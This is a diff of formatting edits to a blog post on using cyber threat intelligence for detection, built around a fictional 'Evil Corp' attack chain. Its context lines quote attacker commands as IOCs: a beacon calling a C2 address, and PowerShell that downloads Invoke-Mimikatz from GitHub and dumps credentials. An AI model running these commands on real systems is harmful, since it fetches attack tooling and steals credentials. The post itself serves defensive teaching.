@@ -57,7 +57,7 @@ Be ----> |command and control traffic| I
 I ----> |command and control traffic| Be
 ```
 
-The team was also able to find some of the commands that were run on the infected systems:
+The team was also able to find some of the commands that were run on the infected systems.
 
 ```powershell
 beacon.exe -c2 13.37.13.37
@@ -80,6 +80,8 @@ $uri = "https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-
 $module = Invoke-RestMethod -Uri $uri
 $creds = Invoke-MImikatz -DumpCreds
 ```
+
+---
 
 Now, we can map this attack chain to artifacts and list them in a table.
 
@@ -108,6 +110,8 @@ Now, we can map this attack chain to artifacts and list them in a table.
 | $uri = "https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1" | Command | Command to download Invoke-Mimikatz |
 | $module = Invoke-RestMethod -Uri $uri | Command | Command to download Invoke-Mimikatz |
 | $creds = Invoke-MImikatz -DumpCreds | Command | Command to dump creds |
+
+---
 
 Now, at this point, some of the artifacts can be used as IOCs. So how do these IOCs get around, who shares them? 
 Well, everyone, really (and ideally). Microsoft has a *trillion trillion trillion* signals and when they detect something, they can choose to share it.
@@ -294,7 +298,7 @@ This is usually not a problem as most TIPs and SIEMs will have a way to set the 
 
 Let's imagine we have done some research on feeds and we've found **3 feeds** that we deem of good quality and we want to use them in our detection.
 
-![](/img/ExpandingOnCTI/feeds.png)
+![](/img/ExpandingOnCTI/Feeds.png)
 
 At this point, we don't really know the quality of the feeds except for the external information we have. To get a better understanding of the quality of the feeds, we can apply some data science. Let's imagine we tag all events from the feeds with their feed number and this information is persisted in the transfer of the IOCs to our SIEM. We can then determine the rate of false and true positives for each feed.
 
@@ -398,7 +402,7 @@ Obviously there are a lot of reg queries that are benign, but there is a limited
 
 ## Where do we go from here?
 
-I think it goes without saying that this is just the tip of the iceberg, we are only scratching the surface of what we can do with CTI in detection and in general. If you don't work specifically with security monitoring or detection, think of how we can apply some of the lessons in this blog to other areas of security.
+I think it goes without saying that this is **just the tip of the iceberg**, we are only scratching the surface of what we can do with CTI in detection and in general. **If you don't work specifically with security monitoring or detection, think of how we can apply some of the lessons in this blog to other areas of security.**
 
 If we think back to the **Evil Corp** attack chain once again, we might take some pointers for our protection. Do we already have a office and email security solution that can help protect us against phishing in place? If so, are our policies and configurations up to date and following best practice? 
 
@@ -407,11 +411,11 @@ Other things we can draw from the information we have might be:
 - If we don't have an EDR solution on our endpoints, maybe it's time to look into that
 - The commands suggest the attacker was able to disable EDR and AV - are we monitoring for these changes? Can we get rid of local administrator rights for our users? Can we enable tamper protection on our EDR solution?
 
-Our CERT, Super Villian CERT, might be able to help provide some insights into the super villian sector and how we can protect ourselves better. What trends are we seeing in attacks? What TTPs are most common?
+Our CERT, Super Villian CERT, might be **able to help provide some insights into the super villian sector and how we can protect ourselves better.** What trends are we seeing in attacks? What TTPs are most common?
 
 Let's assume that attacker in the middle (AiTM) is heavily on the rise in our sector - what can we do with that information? Can we implement some sort of protection against it? Can we detect it? Can we hunt for it?
 
-This is how we can use CTI in more ways than just detection. We can use it to inform across all areas of security, in all sorts of phases and processes. CTI will, if applied correctly, also help us make a more effective and informed shift left. In Microsoft's [Cybersecurity Reference Architecture](https://learn.microsoft.com/en-us/security/adoption/mcra) we can use the following image to illustrate this:
+**This is how we can use CTI in more ways than just detection. We can use it to inform across all areas of security, in all sorts of phases and processes.** CTI will, if applied correctly, also help us make a more effective and informed shift left. In Microsoft's [Cybersecurity Reference Architecture](https://learn.microsoft.com/en-us/security/adoption/mcra) we can use the following image to illustrate this:
 
 ![](/img/ExpandingOnCTI/shiftleft.png)
 
